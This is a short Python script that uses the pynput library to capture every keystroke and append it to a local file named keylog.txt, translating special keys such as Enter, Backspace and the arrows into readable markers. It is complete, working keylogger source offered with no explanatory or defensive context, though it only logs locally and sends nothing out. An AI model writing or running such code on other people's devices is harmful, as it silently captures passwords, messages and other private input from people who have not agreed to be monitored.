from pynput import keyboard

log_file = "keylog.txt"

# Define replacements for special keys
special_keys = {
    "Key.space": " ",
    "Key.enter": "\n",
    "Key.tab": "\t",
    "Key.backspace": "[BACKSPACE]",
    "Key.shift": "",
    "Key.shift_r": "",
    "Key.ctrl_l": "",
    "Key.ctrl_r": "",
    "Key.alt_l": "",
    "Key.alt_r": "",
    "Key.esc": "[ESC]",
    "Key.up": "↑",
    "Key.down": "↓",
    "Key.left": "←",
    "Key.right": "→",
    "Key.caps_lock": "[CAPSLOCK]",
}

def on_press(key):
    try:
        with open(log_file, "a") as file:
            file.write(f"{key.char}")
    except AttributeError:
        k = str(key)
        value = special_keys.get(k, f"[{k.replace('Key.', '').upper()}]")
        with open(log_file, "a") as file:
            file.write(value)

with keyboard.Listener(on_press=on_press) as listener:
    listener.join()
